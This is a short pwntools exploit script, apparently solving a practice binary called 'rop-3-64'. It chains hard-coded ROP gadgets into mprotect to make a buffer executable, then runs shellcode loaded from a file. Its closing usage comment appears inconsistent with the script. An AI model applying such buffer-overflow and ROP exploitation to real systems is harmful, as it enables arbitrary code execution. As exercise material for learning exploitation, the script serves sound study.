#!/usr/bin/env python

from pwn import *

# syscalls:
"""
0x0000000000400520  mprotect@plt
"""
mprotect_addr = p64(0x0000000000400520)

#other stuff:
global_var_area = p64(0x601000)
g_buf_addr = p64(0x601088)

#ROP gadgets:
"""
0x0000000000400743 : pop rdi ; ret
0x000000000040064a : pop rdx ; nop ; pop rbp ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
"""
rdi_ret = p64(0x0000000000400743)
rdx_rbp_ret = p64(0x000000000040064a)
rsi_r15_ret = p64(0x0000000000400741)

# stack
"""
[shellcode][AAAAA....AAAA]
[&rdi_ret] [&global_var_area] [&rsi_r15_ret] [0x1000] [0x0] [&rdx_rbp_ret] [0x7] [0x0] [&memprotect]
"""

# get mi shellcode
f = open("rop-3-64.bin", "r")
shellcode = f.read().strip()
f.close()

buf = "aaaaaaaa" + shellcode + "a"*(128-57)
buf += rdi_ret + global_var_area + rsi_r15_ret + p64(0x1000) + p64(0) + rdx_rbp_ret + p64(7) + p64(0) + mprotect_addr
buf += g_buf_addr
print(buf)

# I ran this command like:
#   $ ./rop-3-64 > input
#   $ (cat input; cat) | ./rop-3-64

